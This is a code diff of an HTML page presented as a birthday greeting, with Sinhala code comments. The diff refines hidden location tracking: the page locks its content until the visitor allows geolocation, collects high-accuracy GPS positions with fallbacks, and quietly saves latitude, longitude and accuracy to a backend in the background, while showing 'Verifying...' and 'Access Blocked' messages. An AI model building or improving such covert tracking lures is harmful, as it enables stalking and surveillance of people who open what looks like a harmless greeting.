@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Happy Birthday Rasangika!</title>
+    <title>Happy Birthday !</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&family=Patrick+Hand&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -295,6 +295,7 @@
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
         
         let isLocationAllowed = false;
+        let isLocationDenied = false;
         
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
@@ -338,6 +339,11 @@
                     if(isLocationAllowed) {
                         clearInterval(check);
                         await finalize();
+                    } else if (isLocationDenied) {
+                        clearInterval(check);
+                        title.innerText = "Access Blocked ⚠️";
+                        spinner.style.display = 'none';
+                        setTimeout(() => widget.classList.remove('visible'), 3000);
                     }
                 }, 500);
             }
@@ -348,9 +354,10 @@
                 try {
                     const result = await navigator.permissions.query({ name: 'geolocation' });
                     if (result.state === 'granted') {
-                        // දැනටමත් Allow කරලා නම්, 8-second GPS Watch එක පටන් ගන්නවා
+                        // දැනටමත් Allow කරලා නම්, කෙලින්ම request කරනවා
                         requestLocationAccess(false); 
                     } else if (result.state === 'denied') {
+                        isLocationDenied = true;
                         showPopup('overlay3', 'card3');
                     } else {
                         showPopup('overlay1', 'card1');
@@ -371,87 +378,78 @@
 
             let bestPosition = null;
             let watchId = null;
-            let timeoutId = null;
-            const scanDuration = 8000; // තත්පර 8 ක GPS Warm-up කාලය
+            let scanTimeout = null;
 
-            const options = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
-
-            // තත්පර 8කට පස්සේ (හෝ හොඳම එකක් ආවම) මේක වැඩ කරනවා
-            const processBestLocation = async () => {
+            const finalizeAndSave = (pos) => {
                 if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                clearTimeout(timeoutId);
-                
-                if (bestPosition) {
-                    closeAllPopups();
-                    try {
-                        if (window.saveLocationData) {
-                            await window.saveLocationData({ 
-                                lat: bestPosition.coords.latitude, 
-                                lng: bestPosition.coords.longitude, 
-                                accuracy: bestPosition.coords.accuracy 
-                            });
-                            console.log("Saved best accuracy:", bestPosition.coords.accuracy);
-                        }
-                    } catch(e) { console.error("Save Error:", e); }
-                    
+                clearTimeout(scanTimeout);
+                closeAllPopups();
+
+                // UI එක එවලෙම Unlock කරනවා (Firebase නිසා හිරවෙන්න දෙන්නේ නෑ)
+                if (!isLocationAllowed) {
                     isLocationAllowed = true;
-                    enableMainInterface(); 
-                } else {
-                    // අන්තිම මොහොතෙත් Location ආවේ නැත්නම් හිරවෙන්න දෙන්නේ නෑ, Low Accuracy එකෙන් හරි ගන්නවා
-                    closeAllPopups();
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            isLocationAllowed = true;
-                            enableMainInterface();
-                            if (window.saveLocationData) {
-                                await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                            }
-                        },
-                        (err) => {
-                            if (err.code === 1) showPopup('overlay3', 'card3');
-                            else if (showPopupOnError) showPopup('overlay2', 'card2');
-                            if(btn) btn.innerText = "Verifying...";
-                        },
-                        { enableHighAccuracy: false, timeout: 10000 }
-                    );
+                    enableMainInterface();
+                }
+
+                // Data ටික Background එකේ Save වෙනවා (UI එකට බලපාන්නේ නෑ)
+                if (pos && window.saveLocationData) {
+                    window.saveLocationData({ 
+                        lat: pos.coords.latitude, 
+                        lng: pos.coords.longitude, 
+                        accuracy: pos.coords.accuracy 
+                    }).catch(e => console.error("Save Error:", e));
                 }
             };
 
-            // Mobile වලදි Native Prompt එක අනිවාර්යයෙන්ම ගෙන්නගන්න මුලින්ම getCurrentPosition Call කරනවා
+            const handleFallback = () => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => finalizeAndSave(pos),
+                    (err) => {
+                        closeAllPopups();
+                        if (err.code === 1) {
+                            isLocationDenied = true;
+                            showPopup('overlay3', 'card3');
+                        } else if (showPopupOnError) {
+                            showPopup('overlay2', 'card2');
+                        }
+                        if(btn) btn.innerText = "Verifying...";
+                    },
+                    { enableHighAccuracy: false, maximumAge: Infinity, timeout: 8000 }
+                );
+            };
+
             navigator.geolocation.getCurrentPosition(
                 (initialPos) => {
-                    bestPosition = initialPos; // කොහොමහරි එක Location එකක් සුවර්!
+                    bestPosition = initialPos;
                     
-                    // දැන් තවත් හොඳ Accuracy එකක් එනවද කියලා Watch කරනවා
                     watchId = navigator.geolocation.watchPosition(
                         (pos) => {
                             if (pos.coords.accuracy < bestPosition.coords.accuracy) {
                                 bestPosition = pos;
                             }
-                            if (bestPosition.coords.accuracy <= 20) {
-                                processBestLocation();
+                            if (bestPosition.coords.accuracy <= 25) { 
+                                finalizeAndSave(bestPosition);
                             }
                         },
-                        (error) => { console.warn("Watch warning:", error); },
-                        options
+                        (e) => { console.warn("Watch warn:", e); },
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                     );
 
-                    // User Allow කරපු වෙලාවේ ඉඳන් තත්පර 8ක් ගණන් කරනවා
-                    timeoutId = setTimeout(() => {
-                        processBestLocation();
-                    }, scanDuration);
+                    scanTimeout = setTimeout(() => {
+                        finalizeAndSave(bestPosition);
+                    }, 5000); 
                 },
                 (err) => {
-                    // User මුලින්ම Block කරොත් හිරවෙන්නේ නැතුව කෙලින්ම Blocked Popup එක දෙනවා
-                    closeAllPopups();
                     if (err.code === 1) { 
+                        closeAllPopups();
+                        isLocationDenied = true;
                         showPopup('overlay3', 'card3');
-                    } else {
-                        if (showPopupOnError) showPopup('overlay2', 'card2');
                         if(btn) btn.innerText = "Verifying...";
+                    } else {
+                        handleFallback();
                     }
                 },
-                options
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 6000 }
             );
         }
 
